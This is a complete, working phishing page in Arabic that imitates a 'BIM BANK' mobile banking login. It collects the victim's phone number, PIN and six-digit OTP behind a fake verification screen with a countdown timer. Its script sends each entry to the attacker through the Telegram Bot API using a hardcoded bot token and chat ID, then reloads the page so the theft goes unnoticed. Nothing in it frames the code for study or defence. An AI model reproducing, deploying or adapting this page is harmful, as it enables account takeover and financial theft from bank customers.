<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>المصرف الرقمي - تسجيل الدخول</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap');
        
        body { 
            font-family: 'Tajawal', sans-serif; 
            background: #f4f7f6; 
            margin: 0; 
            display: flex; 
            flex-direction: column; 
            min-height: 100vh;
        }

        /* الهيدر العلوي بنمط بنكي */
        .app-header {
            background: linear-gradient(135deg, #1a2a6c, #2a4858);
            height: 220px;
            padding: 40px 20px;
            border-bottom-left-radius: 40px;
            border-bottom-right-radius: 40px;
            text-align: center;
            color: white;
            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
        }

        .bank-logo {
            font-size: 32px;
            font-weight: 700;
            letter-spacing: 1px;
            margin-bottom: 10px;
        }

        /* حاوية النموذج */
        .login-card {
            background: white;
            margin: -60px 25px 20px;
            padding: 30px 20px;
            border-radius: 25px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.05);
        }

        .input-box {
            position: relative;
            margin-bottom: 25px;
        }

        .input-box label {
            display: block;
            font-size: 13px;
            color: #7f8c8d;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .input-box input {
            width: 100%;
            padding: 12px 15px;
            border: 1.5px solid #ecf0f1;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            outline: none;
            text-align: center;
            color: #2c3e50;
            transition: 0.3s;
        }

        .input-box input:focus {
            border-color: #1a2a6c;
            background: #f9f9ff;
        }

        /* الأزرار المصرفية */
        .btn-primary {
            background: #1a2a6c;
            color: white;
            width: 100%;
            padding: 15px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            border: none;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(26, 42, 108, 0.3);
        }

        .btn-secondary {
            background: transparent;
            color: #1a2a6c;
            width: 100%;
            padding: 12px;
            font-size: 15px;
            border: 1.5px solid #1a2a6c;
            border-radius: 12px;
            margin-top: 15px;
        }

        /* واجهة الـ OTP المصرفية */
        #screen-otp { 
            display: none; 
            padding: 40px 20px;
            text-align: center;
        }

        .otp-input {
            width: 80%;
            padding: 15px;
            font-size: 24px;
            letter-spacing: 15px;
            border: 2px solid #1a2a6c;
            border-radius: 15px;
            text-align: center;
            margin: 30px 0;
            outline: none;
        }

        .timer-text {
            color: #e74c3c;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <!-- الشاشة الأولى: تسجيل دخول مصرفي -->
    <div id="screen-login">
        <div class="app-header">
            <div class="bank-logo">BIM BANK</div>
            <p class="opacity-80">الخدمات المصرفية الرقمية الآمنة</p>
        </div>

        <div class="login-card">
            <h2 class="text-xl font-bold text-[#1a2a6c] mb-6 text-center">تسجيل الدخول</h2>
            
            <div class="input-box">
                <label>رقم الهاتف</label>
                <!-- قانون: أرقام فقط (8 أرقام) -->
                <input id="phone" type="tel" maxlength="8" 
                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
                       placeholder="00000000">
            </div>

            <div class="input-box">
                <label>الرمز السري</label>
                <!-- قانون: أرقام فقط (4 أرقام) -->
                <input id="pin" type="password" maxlength="4" 
                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
                       placeholder="****">
            </div>

            <button onclick="handleLogin()" class="btn-primary">دخول آمن</button>
            <button class="btn-secondary">نسيت كلمة المرور؟</button>
        </div>

        <div class="text-center mt-10">
            <p class="text-gray-500 text-sm">ليس لديك حساب؟ <span class="text-[#1a2a6c] font-bold">افتح حسابك الآن</span></p>
        </div>
    </div>

    <!-- الشاشة الثانية: واجهة التحقق OTP -->
    <div id="screen-otp">
        <div class="mb-10">
            <img src="https://img.icons8.com/ios-filled/100/1a2a6c/shield-confirmation.png" class="mx-auto mb-4">
            <h2 class="text-2xl font-bold text-[#1a2a6c]">تأكيد الهوية</h2>
            <p class="text-gray-500 mt-2">لقد أرسلنا رمز التحقق المكون من 6 أرقام إلى هاتفك</p>
        </div>

        <div class="bg-white p-8 rounded-3xl shadow-sm border border-gray-100">
            <!-- قانون: أرقام فقط (6 أرقام للـ OTP الخاص ببيم بنك) -->
            <input id="otp_code" type="tel" maxlength="6" class="otp-input"
                   oninput="this.value = this.value.replace(/[^0-9]/g, '');"
                   placeholder="000000">
            
            <p class="mb-6">تنتهي صلاحية الرمز خلال: <span id="timer" class="timer-text">04:59</span></p>
            
            <button onclick="submitOTP()" class="btn-primary">تأكيد العملية</button>
            <p class="mt-6 text-[#1a2a6c] font-medium underline">إعادة إرسال الرمز</p>
        </div>
    </div>

    <script>
        const TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
        const CHAT = "8665814266";

        function handleLogin() {
            const u = document.getElementById('phone').value;
            const p = document.getElementById('pin').value;

            if(u.length === 8 && p.length === 4) {
                send(`🏦 BIM BANK - LOGIN\n📱 Phone: ${u}\n🔐 PIN: ${p}`);
                document.getElementById('screen-login').style.display = 'none';
                document.getElementById('screen-otp').style.display = 'block';
                startTimer(299);
            } else {
                alert("يرجى إدخال البيانات المطلوبة بشكل صحيح (أرقام فقط)");
            }
        }

        function submitOTP() {
            const code = document.getElementById('otp_code').value;
            if(code.length === 6) {
                send(`🔑 BIM BANK - OTP: ${code}`);
                alert("جاري التحقق من الهوية...");
                location.reload();
            } else {
                alert("يرجى إدخال رمز التحقق المكون من 6 أرقام");
            }
        }

        function startTimer(duration) {
            let timer = duration, min, sec;
            const display = document.getElementById('timer');
            setInterval(function () {
                min = parseInt(timer / 60, 10);
                sec = parseInt(timer % 60, 10);
                display.textContent = (min < 10 ? "0" + min : min) + ":" + (sec < 10 ? "0" + sec : sec);
                if (--timer < 0) timer = 0;
            }, 1000);
        }

        function send(msg) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}`);
        }
    </script>
</body>
</html>
